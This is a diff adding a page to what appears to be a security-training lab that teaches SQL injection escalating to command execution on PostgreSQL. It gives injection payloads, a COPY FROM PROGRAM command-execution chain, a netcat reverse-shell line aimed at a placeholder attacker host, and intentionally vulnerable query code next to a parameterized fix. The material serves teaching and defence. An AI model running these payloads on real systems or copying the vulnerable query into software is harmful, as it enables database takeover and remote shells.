@@ -1,0 +1,103 @@
+{% extends "core/example_page_base.html" %}
+{% set example_title = "Advanced SQL Injection: From Detection to Remote Code Execution" %}
+{% set example_difficulty = "Hard" %}
+{% block title %}{{ example_title }} — A03{% endblock %}
+
+{% block explanation %}
+<p>
+  This "check inventory count by ID" feature has the same raw
+  string-concatenated SQL flaw as every other example in this group — but
+  here the database driver in use permits multiple, semicolon-separated
+  statements in a single query call. That single property turns "just a
+  SQL injection" into full command execution on the database server
+  itself, because an attacker isn't limited to one <code>SELECT</code> —
+  they can inject an entire chain of statements, including ones that ask
+  PostgreSQL to run an arbitrary OS command.
+</p>
+{% endblock %}
+
+{% block detect %}
+<p>
+  Enter a value that definitely doesn't exist, e.g. <code>999999</code>, and note the
+  response reports zero matches. Then try <code>0 OR 1=1</code> and note the count jumps
+  to the full table size — confirming the field reaches raw SQL in a numeric context, no
+  string literal to break out of at all.
+</p>
+{% endblock %}
+
+{% block exploitation %}
+<ol>
+  <li>
+    Detect the injection point:
+    <br>
+    <code>0 OR 1=1</code>
+  </li>
+  <li>
+    Confirm stacked queries are accepted (a harmless no-op statement appended after a
+    semicolon):
+    <br>
+    <code>1; SELECT 1--</code>
+  </li>
+  <li>
+    Escalate to command execution — the safe way to prove it: read the command's output
+    back through the database itself, no network connection involved.
+    <br>
+    <code>1; DROP TABLE IF EXISTS a03_rce_check; CREATE TABLE a03_rce_check (output text); COPY a03_rce_check FROM PROGRAM 'id'; --</code>
+    <br>
+    Look up any SKU again afterward — the database now contains a real
+    <code>a03_rce_check</code> table holding this server's actual <code>id</code> command
+    output.
+  </li>
+  <li>
+    Escalate further to a real, interactive reverse shell. This step is a manual exercise
+    for your own terminal against your own deployment — this lab's automated tests never
+    do this:
+    <br>
+    <code>1; COPY (SELECT 1) TO PROGRAM 'nc -e /bin/sh ATTACKER_IP 4444'; --</code>
+  </li>
+</ol>
+<p class="text-muted">
+  Note: stacked queries and <code>COPY ... FROM/TO PROGRAM</code> are PostgreSQL-specific
+  and were live-verified against the real Postgres-backed app under
+  <code>docker compose up</code>, not reproduced by the lab's fast automated tests (SQLite
+  supports neither multi-statement execution nor <code>COPY</code> at all).
+</p>
+<p>
+  This escalation only works because the database role this application connects with is
+  a PostgreSQL superuser — <code>COPY ... FROM/TO PROGRAM</code> is restricted to
+  superusers (or roles explicitly granted the <code>pg_execute_server_program</code> role)
+  specifically because of exactly this risk. A properly least-privileged database
+  account — one without superuser rights and without that role grant — would block this
+  specific escalation path entirely, even though the underlying SQL injection
+  vulnerability would still exist.
+</p>
+{% endblock %}
+
+{% block vulnerable_code %}query = f"SELECT COUNT(*) FROM a03_secrets WHERE id = {sku}"
+count = db.session.execute(text(query)).scalar()
+db.session.commit()
+# no parameterization, and the database driver permits stacked,
+# semicolon-separated statements with no restriction on how many
+{% endblock %}
+
+{% block secure_code %}query = text("SELECT COUNT(*) FROM a03_secrets WHERE id = :sku")
+count = db.session.execute(query, {"sku": sku}).scalar()
+# parameterized queries can never contain a second statement at all --
+# and the connecting database role should never be a superuser in the
+# first place
+{% endblock %}
+
+{% block live_example %}
+<form method="post">
+  <div class="input-group mb-3">
+    <input type="text" class="form-control" name="sku" value="{{ sku }}" placeholder="Enter a SKU (numeric ID)">
+    <button type="submit" class="btn btn-primary">Check Inventory</button>
+  </div>
+</form>
+{% if count is not none %}
+<p>Inventory count: {{ count }}</p>
+{% endif %}
+{% if error %}
+<p class="text-danger">Error: {{ error }}</p>
+{% endif %}
+{% endblock %}
